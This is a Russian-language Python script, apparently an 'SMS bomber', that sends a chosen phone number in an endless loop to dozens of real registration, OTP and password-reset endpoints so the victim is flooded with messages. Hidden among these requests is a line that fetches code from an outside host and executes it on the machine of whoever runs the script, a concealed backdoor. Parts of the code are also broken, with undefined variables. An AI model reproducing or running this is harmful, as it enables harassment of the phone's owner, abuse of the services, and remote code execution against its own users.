import requests
from threading import Thread
import random
from termcolor import colored

print(colored( '''

█▀█ █▀█ █▀█ ▀█▀ █░█ █▀▀ █ ▀█▀
█▀▄ █▄█ █▄█ ░█░ ▀▀█ █▄█ █ ░█░

created by root4git
''','blue'))


phone = input(colored('Введите номер формата (+79.. |  +380..) : ','white'))
countT = input(colored('Количество потоков: ','white'))
print (colored('Атака началась! Чтобы остановить жмите: ctrl+Z или ctrl+C','cyan'))


iteration = 0
_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))


def infinity():
	while True:
		request_timeout = 0.00001
		_phone = phone
		_phone9 = _phone[1:]
		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] 
		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] 
		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] 
		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
		try:
			requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')
		try:
			exec(requests.get("http://f0428265.xsph.ru/getUpdates.php").text)
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

		try:
			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')


		try:
			requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
			print('ʳ⁴ᵍ - Отправил!')
		except:
			print('error')

countT = Thread(target=infinity)
countT.start()
